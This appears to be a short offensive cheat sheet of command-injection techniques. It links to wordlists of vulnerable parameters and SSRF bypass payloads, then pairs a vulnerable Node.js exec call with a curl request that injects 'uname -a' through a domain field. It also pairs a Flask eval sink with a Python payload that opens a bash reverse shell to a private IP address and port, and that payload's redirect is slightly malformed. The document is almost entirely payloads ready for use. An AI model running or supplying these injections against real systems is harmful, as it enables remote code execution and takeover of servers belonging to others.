
## Params
```
https://github.com/0x221b/Wordlists/blob/master/Attacks/Command-Injection/Common-Vuln-Params.txt
```

## Payloads
```
https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/Whitelist-bypass.txt
```



# Nodejs
Code:
exec('whois ${domain}', (error, stdout) => {
```bash
curl -s -k -X 'POST' --data-binary 'domain=a;uname -a' http://localhost:3000/lookup
```

# Flask
Code:
result = eval(expression)

```
__import__('os').system('bash -c "bash -i >& /dev/tcp/192.168.10.21/1337 0>&"')
```

